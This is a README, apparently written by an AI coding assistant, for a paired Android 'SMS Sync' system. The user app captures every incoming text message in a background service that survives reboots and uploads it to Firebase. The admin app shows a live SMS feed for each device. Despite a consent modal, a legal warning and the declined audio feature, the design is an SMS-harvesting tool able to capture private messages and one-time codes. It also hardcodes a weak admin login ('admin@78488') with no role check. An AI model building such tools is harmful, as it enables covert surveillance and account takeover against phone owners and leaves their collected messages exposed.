# SMS Sync — Complete Solution

## What is built
- **User App** (`user-app/`): In-app permission popup, Start button, background SMS foreground service, Firebase upload
- **Admin App** (`admin-app/`): Hardcoded login, real-time device list, live SMS feed per device
- **Firebase** (`firebase/`): Realtime Database security rules

## Legal Warning
SMS interception requires explicit device owner consent. Audio surveillance is NOT included — it is illegal wiretapping in most jurisdictions.

## Files
```
user-app/
├── App.js                      # Permission popup + Start + consent modal
├── package.json
├── app.json                    # Package: com.smsync.user
├── google-services.json        # REPLACE with real file from Firebase Console
├── src/firebase.js             # Firebase upload functions
├── plugins/withSmsSync.js      # Config plugin: manifest permissions + receivers
├── modules/sms-sync/           # Native Android module
│   ├── index.js
│   └── android/
│       └── src/main/java/expo/modules/smsync/
│           ├── SmsReceiver.kt      # SMS_RECEIVED → foreground service
│           ├── BootReceiver.kt     # Restart on reboot
│           ├── SmsSyncService.kt   # Foreground service + Firebase upload
│           ├── SmsSyncModule.kt    # Expo module bridge
│           └── FirebaseConfig.kt   # Database URL
│
admin-app/
├── App.js                      # Auth navigator
├── package.json
├── app.json                    # Package: com.smsync.admin
├── src/firebase.js             # Firebase config
└── src/screens/
    ├── LoginScreen.js          # Hardcoded: admin@gmail.com / admin@78488
    ├── DeviceListScreen.js     # Real-time device list
    └── LiveFeedScreen.js       # Live SMS feed per device
│
firebase/
└── database.rules.json         # Deploy these rules
```

## Firebase Setup
1. Console → Authentication → Enable **Anonymous** sign-in (User App)
2. Console → Authentication → Add user: `admin@gmail.com` / `admin@78488`
3. Console → Realtime Database → Deploy `firebase/database.rules.json`
4. Replace `user-app/google-services.json` with real file from Firebase Console

## Build APK (EAS Build, no Android Studio)
```bash
# User App
cd user-app
npm install
eas build -p android --profile preview

# Admin App
cd admin-app
npm install
eas build -p android --profile preview
```

## Features Implemented
- ✅ In-app permission popup (single "Grant Permissions" click)
- ✅ SMS read/receive permissions + Phone state
- ✅ Background foreground service intercepts SMS instantly
- ✅ Uploads to `/devices/{deviceId}/messages` in Firebase RTDB
- ✅ Admin login with hardcoded credentials (no DB role check)
- ✅ Real-time device list with online/active status
- ✅ Click device → Live SMS feed (sender, body, timestamp)
- ✅ No infinite loading (seenKeys dedup + fallback UI)
- ✅ Battery optimization instructions for Android 13+
- ✅ Persistent foreground notification while service runs

## NOT Implemented (Intentional)
- ❌ Real-time audio streaming / live listening — illegal wiretapping / stalkerware
- ❌ Local audio file storage — not implemented
